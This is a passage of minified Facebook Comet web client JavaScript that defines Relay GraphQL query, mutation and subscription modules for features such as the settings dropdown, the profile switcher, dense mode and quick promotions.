                  "SSIResourcesEatingDisordersHomeCometScreenIXT_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "SSIResourcesEatingDisordersHomeScreenViewModel",
            abstractKey: null,
          },
          Pe = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometUFACDelayedOutroScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "UFACDelayedOutroScreenViewModel",
            abstractKey: null,
          },
          Qe = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "PTFHomeCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBPTFHomeV2ScreenViewModel",
            abstractKey: null,
          },
          Re = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "WhyWeRemovedCommentsScreenComet_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "WhyWeRemovedCommentsScreenViewModel",
            abstractKey: null,
          },
          Se = {
            alias: null,
            args: null,
            kind: "ScalarField",
            name: "id",
            storageKey: null,
          },
          Te = {
            kind: "InlineFragment",
            selections: [Se],
            type: "Node",
            abstractKey: "__isNode",
          };
        return {
          fragment: {
            argumentDefinitions: a,
            kind: "Fragment",
            metadata: null,
            name: "CometActorGatewayExperienceSubscription",
            selections: [
              {
                alias: null,
                args: b,
                concreteType: "XFBActorGatewayScreen",
                kind: "LinkedField",
                name: "actor_gateway_experience_subscribe",
                plural: !1,
                selections: [
                  {
                    alias: null,
                    args: null,
                    concreteType: null,
                    kind: "LinkedField",
                    name: "screen",
                    plural: !1,
                    selections: [c, d],
                    storageKey: null,
                  },
                  e,
                  {
                    alias: null,
                    args: null,
                    concreteType: "QuickPromotion",
                    kind: "LinkedField",
                    name: "quick_promotion",
                    plural: !1,
                    selections: [
                      {
                        alias: null,
                        args: null,
                        concreteType: "CometQuickPromotionSections",
                        kind: "LinkedField",
                        name: "comet_qp_sections",
                        plural: !1,
                        selections: [
                          {
                            alias: null,
                            args: f,
                            concreteType: null,
                            kind: "LinkedField",
                            name: "renderer_strategy",
                            plural: !1,
                            selections: [
                              {
                                kind: "InlineFragment",
                                selections: [
                                  {
                                    alias: null,
                                    args: null,
                                    concreteType:
                                      "XFBActorGatewayIXTCompatibleScreenPayload",
                                    kind: "LinkedField",
                                    name: "ixt_schema_compatible_enrollment_screen_payload",
                                    plural: !1,
                                    selections: [
                                      {
                                        alias: null,
                                        args: null,
                                        concreteType: null,
                                        kind: "LinkedField",
                                        name: "screen",
                                        plural: !1,
                                        selections: [d],
                                        storageKey: null,
                                      },
                                    ],
                                    storageKey: null,
                                  },
                                ],
                                type: "CometQuickPromotionServerDrivenPromptRendererStrategy",
                                abstractKey: null,
                              },
                            ],
                            storageKey: 'renderer_strategy(supported:"4vG8Rw")',
                          },
                        ],
                        storageKey: null,
                      },
                    ],
                    storageKey: null,
                  },
                ],
                storageKey: null,
              },
            ],
            type: "Subscription",
            abstractKey: null,
          },
          kind: "Request",
          operation: {
            argumentDefinitions: a,
            kind: "Operation",
            name: "CometActorGatewayExperienceSubscription",
            selections: [
              {
                alias: null,
                args: b,
                concreteType: "XFBActorGatewayScreen",
                kind: "LinkedField",
                name: "actor_gateway_experience_subscribe",
                plural: !1,
                selections: [
                  {
                    alias: null,
                    args: null,
                    concreteType: null,
                    kind: "LinkedField",
                    name: "screen",
                    plural: !1,
                    selections: [
                      g,
                      c,
                      h,
                      i,
                      j,
                      k,
                      l,
                      m,
                      n,
                      o,
                      p,
                      q,
                      r,
                      s,
                      t,
                      u,
                      v,
                      w,
                      x,
                      y,
                      z,
                      A,
                      B,
                      C,
                      D,
                      E,
                      F,
                      G,
                      H,
                      I,
                      J,
                      K,
                      L,
                      M,
                      N,
                      O,
                      P,
                      Q,
                      R,
                      S,
                      T,
                      U,
                      V,
                      W,
                      X,
                      Y,
                      Z,
                      $,
                      ba,
                      ca,
                      da,
                      ea,
                      fa,
                      ga,
                      ha,
                      ia,
                      ja,
                      ka,
                      la,
                      ma,
                      na,
                      oa,
                      pa,
                      qa,
                      ra,
                      sa,
                      ta,
                      ua,
                      va,
                      wa,
                      xa,
                      ya,
                      za,
                      Aa,
                      Ba,
                      Ca,
                      Da,
                      Ea,
                      Fa,
                      Ga,
                      Ha,
                      Ia,
                      Ja,
                      Ka,
                      La,
                      Ma,
                      Na,
                      Oa,
                      Pa,
                      Qa,
                      Ra,
                      Sa,
                      Ta,
                      Ua,
                      Va,
                      Wa,
                      Xa,
                      Ya,
                      Za,
                      $a,
                      ab,
                      bb,
                      cb,
                      db,
                      eb,
                      fb,
                      gb,
                      hb,
                      ib,
                      jb,
                      kb,
                      lb,
                      mb,
                      nb,
                      ob,
                      pb,
                      qb,
                      rb,
                      sb,
                      tb,
                      ub,
                      vb,
                      wb,
                      xb,
                      yb,
                      zb,
                      Ab,
                      Bb,
                      Cb,
                      Db,
                      Eb,
                      Fb,
                      Gb,
                      Hb,
                      Ib,
                      Jb,
                      Kb,
                      Lb,
                      Mb,
                      Nb,
                      Ob,
                      Pb,
                      Qb,
                      Rb,
                      Sb,
                      Tb,
                      Ub,
                      Vb,
                      Wb,
                      Xb,
                      Yb,
                      Zb,
                      $b,
                      ac,
                      bc,
                      cc,
                      dc,
                      ec,
                      fc,
                      gc,
                      hc,
                      ic,
                      jc,
                      kc,
                      lc,
                      mc,
                      nc,
                      oc,
                      pc,
                      qc,
                      rc,
                      sc,
                      tc,
                      uc,
                      vc,
                      wc,
                      xc,
                      yc,
                      zc,
                      Ac,
                      Bc,
                      Cc,
                      Dc,
                      Ec,
                      Fc,
                      Gc,
                      Hc,
                      Ic,
                      Jc,
                      Kc,
                      Lc,
                      Mc,
                      Nc,
                      Oc,
                      Pc,
                      Qc,
                      Rc,
                      Sc,
                      Tc,
                      Uc,
                      Vc,
                      Wc,
                      Xc,
                      Yc,
                      Zc,
                      $c,
                      ad,
                      bd,
                      cd,
                      dd,
                      ed,
                      fd,
                      gd,
                      hd,
                      id,
                      jd,
                      kd,
                      ld,
                      md,
                      nd,
                      od,
                      pd,
                      qd,
                      rd,
                      sd,
                      td,
                      ud,
                      vd,
                      wd,
                      xd,
                      yd,
                      zd,
                      Ad,
                      Bd,
                      Cd,
                      Dd,
                      Ed,
                      Fd,
                      Gd,
                      Hd,
                      Id,
                      Jd,
                      Kd,
                      Ld,
                      Md,
                      Nd,
                      Od,
                      Pd,
                      Qd,
                      Rd,
                      Sd,
                      Td,
                      Ud,
                      Vd,
                      Wd,
                      Xd,
                      Yd,
                      Zd,
                      $d,
                      ae,
                      be,
                      ce,
                      de,
                      ee,
                      fe,
                      ge,
                      he,
                      ie,
                      je,
                      ke,
                      le,
                      me,
                      ne,
                      oe,
                      pe,
                      qe,
                      re,
                      se,
                      te,
                      ue,
                      ve,
                      we,
                      xe,
                      ye,
                      ze,
                      Ae,
                      Be,
                      Ce,
                      De,
                      Ee,
                      Fe,
                      Ge,
                      He,
                      Ie,
                      Je,
                      Ke,
                      Le,
                      Me,
                      Ne,
                      Oe,
                      Pe,
                      Qe,
                      Re,
                      Te,
                    ],
                    storageKey: null,
                  },
                  e,
                  {
                    alias: null,
                    args: null,
                    concreteType: "QuickPromotion",
                    kind: "LinkedField",
                    name: "quick_promotion",
                    plural: !1,
                    selections: [
                      {
                        alias: null,
                        args: null,
                        concreteType: "CometQuickPromotionSections",
                        kind: "LinkedField",
                        name: "comet_qp_sections",
                        plural: !1,
                        selections: [
                          {
                            alias: null,
                            args: f,
                            concreteType: null,
                            kind: "LinkedField",
                            name: "renderer_strategy",
                            plural: !1,
                            selections: [
                              g,
                              {
                                kind: "InlineFragment",
                                selections: [
                                  {
                                    alias: null,
                                    args: null,
                                    concreteType:
                                      "XFBActorGatewayIXTCompatibleScreenPayload",
                                    kind: "LinkedField",
                                    name: "ixt_schema_compatible_enrollment_screen_payload",
                                    plural: !1,
                                    selections: [
                                      {
                                        alias: null,
                                        args: null,
                                        concreteType: null,
                                        kind: "LinkedField",
                                        name: "screen",
                                        plural: !1,
                                        selections: [
                                          g,
                                          h,
                                          i,
                                          j,
                                          k,
                                          l,
                                          m,
                                          n,
                                          o,
                                          p,
                                          q,
                                          r,
                                          s,
                                          t,
                                          u,
                                          v,
                                          w,
                                          x,
                                          y,
                                          z,
                                          A,
                                          B,
                                          C,
                                          D,
                                          E,
                                          F,
                                          G,
                                          H,
                                          I,
                                          J,
                                          K,
                                          L,
                                          M,
                                          N,
                                          O,
                                          P,
                                          Q,
                                          R,
                                          S,
                                          T,
                                          U,
                                          V,
                                          W,
                                          X,
                                          Y,
                                          Z,
                                          $,
                                          ba,
                                          ca,
                                          da,
                                          ea,
                                          fa,
                                          ga,
                                          ha,
                                          ia,
                                          ja,
                                          ka,
                                          la,
                                          ma,
                                          na,
                                          oa,
                                          pa,
                                          qa,
                                          ra,
                                          sa,
                                          ta,
                                          ua,
                                          va,
                                          wa,
                                          xa,
                                          ya,
                                          za,
                                          Aa,
                                          Ba,
                                          Ca,
                                          Da,
                                          Ea,
                                          Fa,
                                          Ga,
                                          Ha,
                                          Ia,
                                          Ja,
                                          Ka,
                                          La,
                                          Ma,
                                          Na,
                                          Oa,
                                          Pa,
                                          Qa,
                                          Ra,
                                          Sa,
                                          Ta,
                                          Ua,
                                          Va,
                                          Wa,
                                          Xa,
                                          Ya,
                                          Za,
                                          $a,
                                          ab,
                                          bb,
                                          cb,
                                          db,
                                          eb,
                                          fb,
                                          gb,
                                          hb,
                                          ib,
                                          jb,
                                          kb,
                                          lb,
                                          mb,
                                          nb,
                                          ob,
                                          pb,
                                          qb,
                                          rb,
                                          sb,
                                          tb,
                                          ub,
                                          vb,
                                          wb,
                                          xb,
                                          yb,
                                          zb,
                                          Ab,
                                          Bb,
                                          Cb,
                                          Db,
                                          Eb,
                                          Fb,
                                          Gb,
                                          Hb,
                                          Ib,
                                          Jb,
                                          Kb,
                                          Lb,
                                          Mb,
                                          Nb,
                                          Ob,
                                          Pb,
                                          Qb,
                                          Rb,
                                          Sb,
                                          Tb,
                                          Ub,
                                          Vb,
                                          Wb,
                                          Xb,
                                          Yb,
                                          Zb,
                                          $b,
                                          ac,
                                          bc,
                                          cc,
                                          dc,
                                          ec,
                                          fc,
                                          gc,
                                          hc,
                                          ic,
                                          jc,
                                          kc,
                                          lc,
                                          mc,
                                          nc,
                                          oc,
                                          pc,
                                          qc,
                                          rc,
                                          sc,
                                          tc,
                                          uc,
                                          vc,
                                          wc,
                                          xc,
                                          yc,
                                          zc,
                                          Ac,
                                          Bc,
                                          Cc,
                                          Dc,
                                          Ec,
                                          Fc,
                                          Gc,
                                          Hc,
                                          Ic,
                                          Jc,
                                          Kc,
                                          Lc,
                                          Mc,
                                          Nc,
                                          Oc,
                                          Pc,
                                          Qc,
                                          Rc,
                                          Sc,
                                          Tc,
                                          Uc,
                                          Vc,
                                          Wc,
                                          Xc,
                                          Yc,
                                          Zc,
                                          $c,
                                          ad,
                                          bd,
                                          cd,
                                          dd,
                                          ed,
                                          fd,
                                          gd,
                                          hd,
                                          id,
                                          jd,
                                          kd,
                                          ld,
                                          md,
                                          nd,
                                          od,
                                          pd,
                                          qd,
                                          rd,
                                          sd,
                                          td,
                                          ud,
                                          vd,
                                          wd,
                                          xd,
                                          yd,
                                          zd,
                                          Ad,
                                          Bd,
                                          Cd,
                                          Dd,
                                          Ed,
                                          Fd,
                                          Gd,
                                          Hd,
                                          Id,
                                          Jd,
                                          Kd,
                                          Ld,
                                          Md,
                                          Nd,
                                          Od,
                                          Pd,
                                          Qd,
                                          Rd,
                                          Sd,
                                          Td,
                                          Ud,
                                          Vd,
                                          Wd,
                                          Xd,
                                          Yd,
                                          Zd,
                                          $d,
                                          ae,
                                          be,
                                          ce,
                                          de,
                                          ee,
                                          fe,
                                          ge,
                                          he,
                                          ie,
                                          je,
                                          ke,
                                          le,
                                          me,
                                          ne,
                                          oe,
                                          pe,
                                          qe,
                                          re,
                                          se,
                                          te,
                                          ue,
                                          ve,
                                          we,
                                          xe,
                                          ye,
                                          ze,
                                          Ae,
                                          Be,
                                          Ce,
                                          De,
                                          Ee,
                                          Fe,
                                          Ge,
                                          He,
                                          Ie,
                                          Je,
                                          Ke,
                                          Le,
                                          Me,
                                          Ne,
                                          Oe,
                                          Pe,
                                          Qe,
                                          Re,
                                          Te,
                                        ],
                                        storageKey: null,
                                      },
                                    ],
                                    storageKey: null,
                                  },
                                ],
                                type: "CometQuickPromotionServerDrivenPromptRendererStrategy",
                                abstractKey: null,
                              },
                            ],
                            storageKey: 'renderer_strategy(supported:"4vG8Rw")',
                          },
                        ],
                        storageKey: null,
                      },
                      Se,
                    ],
                    storageKey: null,
                  },
                ],
                storageKey: null,
              },
            ],
          },
          params: {
            id: aa(
              "CometActorGatewayExperienceSubscription_facebookRelayOperation"
            ),
            metadata: { subscriptionName: "actor_gateway_experience_subscribe" },
            name: "CometActorGatewayExperienceSubscription",
            operationKind: "subscription",
            text: null,
          },
        };
      })();
      d.exports = a;
    },
    null
  );
  __d(
    "CometSettingsBadgeQuery.graphql",
    ["relay-runtime"],
    function (a, b, c, d, e, f) {
      "use strict";
      a = (function () {
        var a = [
          {
            alias: null,
            args: null,
            concreteType: "Viewer",
            kind: "LinkedField",
            name: "viewer",
            plural: !1,
            selections: [
              {
                alias: null,
                args: null,
                kind: "ScalarField",
                name: "device_switchable_account_has_notification",
                storageKey: null,
              },
            ],
            storageKey: null,
          },
        ];
        return {
          fragment: {
            argumentDefinitions: [],
            kind: "Fragment",
            metadata: null,
            name: "CometSettingsBadgeQuery",
            selections: a,
            type: "Query",
            abstractKey: null,
          },
          kind: "Request",
          operation: {
            argumentDefinitions: [],
            kind: "Operation",
            name: "CometSettingsBadgeQuery",
            selections: a,
          },
          params: {
            id: "6598070783582096",
            metadata: {},
            name: "CometSettingsBadgeQuery",
            operationKind: "query",
            text: null,
          },
        };
      })();
      b("relay-runtime").PreloadableQueryRegistry.set(a.params.id, a);
      e.exports = a;
    },
    null
  );
  __d(
    "CometSettingsDropdownTriggerQuery.graphql",
    ["relay-runtime"],
    function (a, b, c, d, e, f) {
      "use strict";
      a = (function () {
        var a = {
            defaultValue: null,
            kind: "LocalArgument",
            name: "coreAppAdminProfileSwitcherNuxId",
          },
          b = {
            defaultValue: null,
            kind: "LocalArgument",
            name: "pageManagementNuxId",
          },
          c = {
            defaultValue: null,
            kind: "LocalArgument",
            name: "profileSwitcherAdminEducationNuxId",
          },
          d = {
            defaultValue: null,
            kind: "LocalArgument",
            name: "profileSwitcherNuxId",
          },
          e = { defaultValue: null, kind: "LocalArgument", name: "showNewToast" },
          f = [
            {
              kind: "Variable",
              name: "nux_id",
              variableName: "pageManagementNuxId",
            },
          ],
          g = {
            alias: null,
            args: null,
            kind: "ScalarField",
            name: "should_show",
            storageKey: null,
          },
          h = [g],
          i = [
            {
              kind: "Variable",
              name: "nux_id",
              variableName: "profileSwitcherNuxId",
            },
          ],
          j = [
            {
              kind: "Variable",
              name: "nux_id",
              variableName: "coreAppAdminProfileSwitcherNuxId",
            },
          ],
          k = [
            {
              kind: "Variable",
              name: "nux_id",
              variableName: "profileSwitcherAdminEducationNuxId",
            },
          ],
          l = {
            kind: "InlineFragment",
            selections: [
              {
                alias: null,
                args: null,
                kind: "ScalarField",
                name: "name",
                storageKey: null,
              },
              {
                alias: null,
                args: [
                  { kind: "Literal", name: "height", value: 32 },
                  { kind: "Literal", name: "width", value: 32 },
                ],
                concreteType: "Image",
                kind: "LinkedField",
                name: "profile_picture",
                plural: !1,
                selections: [
                  {
                    alias: null,
                    args: null,
                    kind: "ScalarField",
                    name: "uri",
                    storageKey: null,
                  },
                ],
                storageKey: "profile_picture(height:32,width:32)",
              },
              {
                alias: null,
                args: null,
                kind: "ScalarField",
                name: "user_category_with_admins_or_limited_access_roles",
                storageKey: null,
              },
              {
                alias: null,
                args: null,
                kind: "ScalarField",
                name: "should_show_soap_onboarding_dialog",
                storageKey: null,
              },
              {
                alias: null,
                args: null,
                concreteType: "UserProfileSwitcherEligibleProfilesConnection",
                kind: "LinkedField",
                name: "profile_switcher_eligible_profiles",
                plural: !1,
                selections: [
                  {
                    alias: null,
                    args: null,
                    kind: "ScalarField",
                    name: "count",
                    storageKey: null,
                  },
                ],
                storageKey: null,
              },
              {
                alias: null,
                args: null,
                kind: "ScalarField",
                name: "is_additional_profile_plus",
                storageKey: null,
              },
            ],
            type: "User",
            abstractKey: null,
          },
          m = {
            alias: null,
            args: null,
            kind: "ScalarField",
            name: "__typename",
            storageKey: null,
          },
          n = {
            alias: null,
            args: null,
            kind: "ScalarField",
            name: "id",
            storageKey: null,
          };
        g = [m, g, n];
        return {
          fragment: {
            argumentDefinitions: [a, b, c, d, e],
            kind: "Fragment",
            metadata: null,
            name: "CometSettingsDropdownTriggerQuery",
            selections: [
              {
                alias: "page_management_nux",
                args: f,
                concreteType: null,
                kind: "LinkedField",
                name: "nux",
                plural: !1,
                selections: h,
                storageKey: null,
              },
              {
                alias: "profile_switcher_nux",
                args: i,
                concreteType: null,
                kind: "LinkedField",
                name: "nux",
                plural: !1,
                selections: h,
                storageKey: null,
              },
              {
                alias: "core_app_admin_profile_switcher_nux",
                args: j,
                concreteType: null,
                kind: "LinkedField",
                name: "nux",
                plural: !1,
                selections: h,
                storageKey: null,
              },
              {
                alias: "profile_switcher_admin_education_nux",
                args: k,
                concreteType: null,
                kind: "LinkedField",
                name: "nux",
                plural: !1,
                selections: h,
                storageKey: null,
              },
              {
                alias: null,
                args: null,
                concreteType: "Viewer",
                kind: "LinkedField",
                name: "viewer",
                plural: !1,
                selections: [
                  {
                    alias: null,
                    args: null,
                    concreteType: null,
                    kind: "LinkedField",
                    name: "actor",
                    plural: !1,
                    selections: [l],
                    storageKey: null,
                  },
                ],
                storageKey: null,
              },
              {
                condition: "showNewToast",
                kind: "Condition",
                passingValue: !0,
                selections: [
                  {
                    args: null,
                    kind: "FragmentSpread",
                    name: "CometProfileSwitchedToastDeferred_query",
                  },
                ],
              },
            ],
            type: "Query",
            abstractKey: null,
          },
          kind: "Request",
          operation: {
            argumentDefinitions: [b, d, a, c, e],
            kind: "Operation",
            name: "CometSettingsDropdownTriggerQuery",
            selections: [
              {
                alias: "page_management_nux",
                args: f,
                concreteType: null,
                kind: "LinkedField",
                name: "nux",
                plural: !1,
                selections: g,
                storageKey: null,
              },
              {
                alias: "profile_switcher_nux",
                args: i,
                concreteType: null,
                kind: "LinkedField",
                name: "nux",
                plural: !1,
                selections: g,
                storageKey: null,
              },
              {
                alias: "core_app_admin_profile_switcher_nux",
                args: j,
                concreteType: null,
                kind: "LinkedField",
                name: "nux",
                plural: !1,
                selections: g,
                storageKey: null,
              },
              {
                alias: "profile_switcher_admin_education_nux",
                args: k,
                concreteType: null,
                kind: "LinkedField",
                name: "nux",
                plural: !1,
                selections: g,
                storageKey: null,
              },
              {
                alias: null,
                args: null,
                concreteType: "Viewer",
                kind: "LinkedField",
                name: "viewer",
                plural: !1,
                selections: [
                  {
                    alias: null,
                    args: null,
                    concreteType: null,
                    kind: "LinkedField",
                    name: "actor",
                    plural: !1,
                    selections: [m, l, n],
                    storageKey: null,
                  },
                ],
                storageKey: null,
              },
              {
                condition: "showNewToast",
                kind: "Condition",
                passingValue: !0,
                selections: [
                  {
                    alias: null,
                    args: null,
                    concreteType: "Viewer",
                    kind: "LinkedField",
                    name: "viewer",
                    plural: !1,
                    selections: [
                      {
                        alias: null,
                        args: null,
                        concreteType: null,
                        kind: "LinkedField",
                        name: "actor",
                        plural: !1,
                        selections: [
                          {
                            kind: "InlineFragment",
                            selections: [
                              {
                                alias: null,
                                args: null,
                                kind: "ScalarField",
                                name: "username",
                                storageKey: null,
                              },
                              {
                                alias: null,
                                args: null,
                                kind: "ScalarField",
                                name: "profile_type_name_for_content",
                                storageKey: null,
                              },
                              {
                                alias: null,
                                args: null,
                                concreteType:
                                  "UserProfileSwitcherEligibleProfilesConnection",
                                kind: "LinkedField",
                                name: "profile_switcher_eligible_profiles",
                                plural: !1,
                                selections: [
                                  {
                                    alias: null,
                                    args: null,
                                    concreteType:
                                      "ProfileSwitcherEligibleProfile",
                                    kind: "LinkedField",
                                    name: "nodes",
                                    plural: !0,
                                    selections: [
                                      {
                                        alias: null,
                                        args: null,
                                        concreteType: "User",
                                        kind: "LinkedField",
                                        name: "profile",
                                        plural: !1,
                                        selections: [n],
                                        storageKey: null,
                                      },
                                    ],
                                    storageKey: null,
                                  },
                                ],
                                storageKey: null,
                              },
                            ],
                            type: "User",
                            abstractKey: null,
                          },
                        ],
                        storageKey: null,
                      },
                    ],
                    storageKey: null,
                  },
                  {
                    alias: null,
                    args: null,
                    kind: "ScalarField",
                    name: "logout_whitelist",
                    storageKey: null,
                  },
                ],
              },
            ],
          },
          params: {
            id: "6287151654667869",
            metadata: {},
            name: "CometSettingsDropdownTriggerQuery",
            operationKind: "query",
            text: null,
          },
        };
      })();
      b("relay-runtime").PreloadableQueryRegistry.set(a.params.id, a);
      e.exports = a;
    },
    null
  );
  __d(
    "CometSetDenseModeMutation_facebookRelayOperation",
    [],
    function (a, b, c, d, e, f) {
      e.exports = "4486145264820781";
    },
    null
  );
  __d(
    "CometSetDenseModeMutation.graphql",
    ["CometSetDenseModeMutation_facebookRelayOperation"],
    function (a, b, c, d, e, f) {
      "use strict";
      a = (function () {
        var a = [{ defaultValue: null, kind: "LocalArgument", name: "input" }],
          c = [
            {
              alias: null,
              args: [{ kind: "Variable", name: "input", variableName: "input" }],
              concreteType: "SetDenseModeResponsePayload",
              kind: "LinkedField",
              name: "set_dense_mode",
              plural: !1,
              selections: [
                {
                  alias: null,
                  args: null,
                  concreteType: "Viewer",
                  kind: "LinkedField",
                  name: "viewer",
                  plural: !1,
                  selections: [
                    {
                      alias: null,
                      args: null,
                      kind: "ScalarField",
                      name: "dense_mode_setting",
                      storageKey: null,
                    },
                  ],
                  storageKey: null,
                },
              ],
              storageKey: null,
            },
          ];
        return {
          fragment: {
            argumentDefinitions: a,
            kind: "Fragment",
            metadata: null,
            name: "CometSetDenseModeMutation",
            selections: c,
            type: "Mutation",
            abstractKey: null,
          },
          kind: "Request",
          operation: {
            argumentDefinitions: a,
            kind: "Operation",
            name: "CometSetDenseModeMutation",
            selections: c,
          },
          params: {
            id: b("CometSetDenseModeMutation_facebookRelayOperation"),
            metadata: {},
            name: "CometSetDenseModeMutation",
            operationKind: "mutation",
            text: null,
          },
        };
      })();
      e.exports = a;
    },
    null
  );
  __d(
    "SetAreSingleKeysDisabledSettingCometCometCustomKeyCommandsMutation_facebookRelayOperation",
    [],
    function (a, b, c, d, e, f) {
      e.exports = "4860082050712954";
    },
    null
  );
  __d(
    "SetAreSingleKeysDisabledSettingCometCometCustomKeyCommandsMutation.graphql",
    [
      "SetAreSingleKeysDisabledSettingCometCometCustomKeyCommandsMutation_facebookRelayOperation",
    ],
    function (a, b, c, d, e, f) {
      "use strict";
      a = (function () {
        var a = [{ defaultValue: null, kind: "LocalArgument", name: "input" }],
          c = [
            {
              alias: null,
              args: [{ kind: "Variable", name: "data", variableName: "input" }],
              concreteType:
                "SetAreSingleKeysDisabledCustomKeyCommandsResponsePayload",
              kind: "LinkedField",
              name: "set_are_single_keys_disabled_custom_key_commands",
              plural: !1,
              selections: [
                {
                  alias: null,
                  args: null,
                  kind: "ScalarField",
                  name: "client_mutation_id",
                  storageKey: null,
                },
              ],
              storageKey: null,
            },
          ];
        return {
          fragment: {
            argumentDefinitions: a,
            kind: "Fragment",
            metadata: null,
            name: "SetAreSingleKeysDisabledSettingCometCometCustomKeyCommandsMutation",
            selections: c,
            type: "Mutation",
            abstractKey: null,
          },
          kind: "Request",
          operation: {
            argumentDefinitions: a,
            kind: "Operation",
            name: "SetAreSingleKeysDisabledSettingCometCometCustomKeyCommandsMutation",
            selections: c,
          },
          params: {
            id: b(
              "SetAreSingleKeysDisabledSettingCometCometCustomKeyCommandsMutation_facebookRelayOperation"
            ),
            metadata: {},
            name: "SetAreSingleKeysDisabledSettingCometCometCustomKeyCommandsMutation",
            operationKind: "mutation",
            text: null,
          },
        };
      })();
      e.exports = a;
    },
    null
  );
  __d(
    "CometAppNavigationProfileSwitcherConfigQuery$Parameters",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      a = {
        kind: "PreloadableConcreteRequest",
        params: {
          id: "6855181221172175",
          metadata: {},
          name: "CometAppNavigationProfileSwitcherConfigQuery",
          operationKind: "query",
          text: null,
        },
      };
      e.exports = a;
    },
    null
  );
  __d(
    "CometAppNavigationProfileSwitcherConfigQuery.graphql",
    ["relay-runtime"],
    function (a, b, c, d, e, f) {
      "use strict";
      a = (function () {
        var a = [{ defaultValue: null, kind: "LocalArgument", name: "scale" }],
          b = {
            kind: "InlineFragment",
            selections: [
              {
                alias: null,
                args: null,
                concreteType: "UserProfileSwitcherEligibleProfilesConnection",
                kind: "LinkedField",
                name: "profile_switcher_eligible_profiles",
                plural: !1,
                selections: [
                  {
                    alias: null,
                    args: null,
                    kind: "ScalarField",
                    name: "count",
                    storageKey: null,
                  },
                ],
                storageKey: null,
              },
              {
                alias: null,
                args: [
                  { kind: "Literal", name: "height", value: 40 },
                  { kind: "Variable", name: "scale", variableName: "scale" },
                  { kind: "Literal", name: "width", value: 40 },
                ],
                concreteType: "Image",
                kind: "LinkedField",
                name: "profile_picture",
                plural: !1,
                selections: [
                  {
                    alias: null,
                    args: null,
                    kind: "ScalarField",
                    name: "uri",
                    storageKey: null,
                  },
                ],
                storageKey: null,
              },
            ],
            type: "User",
            abstractKey: null,
          };
        return {
          fragment: {
            argumentDefinitions: a,
            kind: "Fragment",
            metadata: null,
            name: "CometAppNavigationProfileSwitcherConfigQuery",
            selections: [
              {
                alias: null,
                args: null,
                concreteType: "Viewer",
                kind: "LinkedField",
                name: "viewer",
                plural: !1,
                selections: [
                  {
                    alias: null,
                    args: null,
                    concreteType: null,
                    kind: "LinkedField",
                    name: "actor",
                    plural: !1,
                    selections: [b],
                    storageKey: null,
                  },
                ],
                storageKey: null,
              },
            ],
            type: "Query",
            abstractKey: null,
          },
          kind: "Request",
          operation: {
            argumentDefinitions: a,
            kind: "Operation",
            name: "CometAppNavigationProfileSwitcherConfigQuery",
            selections: [
              {
                alias: null,
                args: null,
                concreteType: "Viewer",
                kind: "LinkedField",
                name: "viewer",
                plural: !1,
                selections: [
                  {
                    alias: null,
                    args: null,
                    concreteType: null,
                    kind: "LinkedField",
                    name: "actor",
                    plural: !1,
                    selections: [
                      {
                        alias: null,
                        args: null,
                        kind: "ScalarField",
                        name: "__typename",
                        storageKey: null,
                      },
                      b,
                      {
                        alias: null,
                        args: null,
                        kind: "ScalarField",
                        name: "id",
                        storageKey: null,
                      },
                    ],
                    storageKey: null,
                  },
                ],
                storageKey: null,
              },
            ],
          },
          params: {
            id: "6855181221172175",
            metadata: {},
            name: "CometAppNavigationProfileSwitcherConfigQuery",
            operationKind: "query",
            text: null,
          },
        };
      })();
      b("relay-runtime").PreloadableQueryRegistry.set(a.params.id, a);
      e.exports = a;
    },
    null
  );
  __d(
    "CometMessagingJewelDropdownQuery_facebookRelayOperation",
    [],
    function (a, b, c, d, e, f) {
      e.exports = "6966525660108008";
    },
    null
  );
  __d(
    "CometMessagingJewelDropdownQuery$Parameters",
    ["CometMessagingJewelDropdownQuery_facebookRelayOperation"],
    function (a, b, c, d, e, f) {
      "use strict";
      a = {
        kind: "PreloadableConcreteRequest",
        params: {
          id: b("CometMessagingJewelDropdownQuery_facebookRelayOperation"),
          metadata: {},
          name: "CometMessagingJewelDropdownQuery",
          operationKind: "query",
          text: null,
        },
      };
      e.exports = a;
    },
    null
  );
  __d(
    "CometQuickPromotionInterstitialQuery.graphql",
    ["relay-runtime"],
    function (a, b, c, d, e, f) {
      "use strict";
      a = (function () {
        var a = [
            { kind: "Literal", name: "surface_nux_id", value: 3394 },
            { kind: "Literal", name: "trigger", value: "NEWSFEED" },
          ],
          b = [{ kind: "Literal", name: "supported", value: "4jMkec" }],
          c = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CometQuickPromotionInterstitialQuery",
                fragmentName:
                  "CometQuickPromotionInterstitialFacebookProtectRendererStrategy_quickPromotion",
                fragmentPropName: "quickPromotion",
                kind: "ModuleImport",
              },
            ],
            type: "CometQuickPromotionInterstitialFacebookProtectRendererStrategy",
            abstractKey: null,
          },
          d = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CometQuickPromotionInterstitialQuery",
                fragmentName:
                  "QPCometMigrateTUFTestUserToPTUInterstitialUpsellRendererStrategy_quickPromotion",
                fragmentPropName: "quickPromotion",
                kind: "ModuleImport",
              },
            ],
            type: "XFBQPCometMigrateTUFTestUserToPTUInterstitialUpsellRendererStrategy",
            abstractKey: null,
          },
          e = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CometQuickPromotionInterstitialQuery",
                fragmentName:
                  "CometQuickPromotionCAAWebSavePasswordInterstitialRendererStrategy_quickPromotion",
                fragmentPropName: "quickPromotion",
                kind: "ModuleImport",
              },
            ],
            type: "CometQuickPromotionCAAWebSPIDialogRendererStrategy",
            abstractKey: null,
          },
          f = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CometQuickPromotionInterstitialQuery",
                fragmentName:
                  "CometQuickPromotionConsentUIFrameworkSaharaContextualConsentInterstitialRendererStrategy_consent",
                fragmentPropName: "consent",
                kind: "ModuleImport",
              },
            ],
